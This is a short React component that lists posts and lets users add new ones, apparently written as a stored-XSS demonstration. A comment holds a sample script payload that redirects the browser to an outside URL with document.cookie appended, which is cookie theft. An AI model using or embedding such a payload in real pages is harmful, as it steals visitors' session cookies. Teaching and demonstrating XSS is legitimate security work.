import Post from "./Post";
import AddPost from './AddPost';
import { useState } from "react";

const List = () => {
   // A persistant XSS coming from storage
    const listOfPosts = ["Post 1", "Post 2", "Post 3"]; 
    // <script>{
    //     window.location = 'https://www.google.com/?cookie=' + document.cookie}
    // </script>;


    let [posts, setNewPost] = useState(listOfPosts);

    const addPost = (post) => {
        const newSetOfPosts = posts.slice();
        newSetOfPosts.push(post);
        setNewPost(newSetOfPosts);
    }
    const postsToDisplay = posts.map(each => <Post key={each} counter={each}></Post>)
    return <div>
        {postsToDisplay}
        <AddPost onAdd={addPost}></AddPost>
    </div>
}

export default List;